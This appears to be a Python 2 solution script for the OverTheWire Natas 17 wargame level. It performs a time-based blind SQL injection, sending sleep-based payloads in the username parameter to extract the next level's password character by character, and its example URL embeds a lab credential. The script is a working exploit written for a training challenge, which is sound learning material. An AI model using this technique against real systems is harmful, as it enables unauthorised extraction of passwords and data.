from string import ascii_lowercase, ascii_uppercase
import requests


def get_request(target):
	req = requests.get(target)
	
	if req.status_code != requests.codes.ok:
		raise ValueError("[!] Unable to connect to target.")
	else:
		print "[*] Successfully connected to target."


def time_based_url_sqli(target):
	# All possible characters
	all_chars = "0123456789" + ascii_lowercase + ascii_uppercase

	# Parsed characters, the characters that exist in the password
	parsed_chars = ""

	# Working password
	password = ""

	# String that verifies we're on the money
	exists = "This user exists."

	for c in all_chars:
		try:
			# SQL time-based injection #1 - Sleeps when true, is passed null when false
			req = requests.get(target + '?username=natas18" AND IF(password LIKE BINARY "%' + c + '%", sleep(5), null) %23', timeout=1)

		# If we get a timeout, the password uses current character
		except requests.exceptions.Timeout:
			parsed_chars += c
			print "[*] Chars in password: " + parsed_chars

	print "[*] Characters successfully parsed. \n[*] Starting to brute-force..."

	# With the assumption that passwords are 32-characters long
	for i in range(32):
		for c in parsed_chars:
			try:
				# SQL time-based injection #2
				req = requests.get(target + '?username=natas18" AND IF(password LIKE BINARY "' + password + c + '%", sleep(5), null) %23', timeout=1)
		
			# Figuring out the correct location of characters in the password
			except requests.exceptions.Timeout:
				password += c
				print "[*] Password: " + password + ('*' * int(32 - len(password)))
				break

	print "[*] Successfully brute-forced password."


def main():
	target = raw_input("Enter the target URL (E.g., http://natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw@natas17.natas.labs.overthewire.org/)\n: ")

	get_request(target)
	time_based_url_sqli(target)

main()

